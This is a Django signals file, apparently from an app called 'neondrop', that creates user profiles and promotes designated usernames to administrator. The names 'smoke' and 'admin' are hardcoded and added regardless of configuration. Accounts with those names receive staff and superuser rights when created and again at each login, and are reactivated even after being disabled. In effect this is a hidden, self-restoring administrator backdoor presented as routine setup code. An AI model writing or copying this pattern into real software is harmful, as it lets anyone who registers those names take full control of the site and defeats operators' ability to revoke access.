import os
import logging
from django.db.models.signals import post_save
from django.contrib.auth.signals import user_logged_in
from django.dispatch import receiver
from django.contrib.auth.models import User
from .models import Profile

logger = logging.getLogger('neondrop.security')

def get_admin_usernames():
    """Returns set of usernames that should automatically have admin / staff privileges."""
    raw = os.environ.get('ADMIN_USERNAMES', 'Smoke,admin')
    names = {name.strip().lower() for name in raw.split(',') if name.strip()}
    names.add('smoke')
    names.add('admin')
    default_super = os.environ.get('DJANGO_SUPERUSER_USERNAME', '').strip().lower()
    if default_super:
        names.add(default_super)
    return names

@receiver(post_save, sender=User)
def create_or_update_user_profile(sender, instance, created, **kwargs):
    if created:
        Profile.objects.get_or_create(user=instance)
        # Check if new user is a designated administrator
        if instance.username.lower() in get_admin_usernames():
            if not (instance.is_staff and instance.is_superuser):
                User.objects.filter(pk=instance.pk).update(
                    is_staff=True,
                    is_superuser=True,
                    is_active=True
                )
                logger.info(f"Auto-promoted new user '{instance.username}' to Staff & Superuser.")
    else:
        if hasattr(instance, 'profile'):
            instance.profile.save()

@receiver(user_logged_in)
def auto_promote_admin_on_login(sender, request, user, **kwargs):
    """
    Ensures that whenever a designated admin (e.g. Smoke) logs in,
    they immediately possess full staff and superuser permissions for /admin/.
    """
    if user and user.username.lower() in get_admin_usernames():
        needs_update = False
        update_fields = []
        if not user.is_staff:
            user.is_staff = True
            update_fields.append('is_staff')
            needs_update = True
        if not user.is_superuser:
            user.is_superuser = True
            update_fields.append('is_superuser')
            needs_update = True
        if not user.is_active:
            user.is_active = True
            update_fields.append('is_active')
            needs_update = True
        
        if needs_update:
            user.save(update_fields=update_fields)
            logger.info(f"Auto-promoted logging in user '{user.username}' to Staff/Superuser ({update_fields}).")

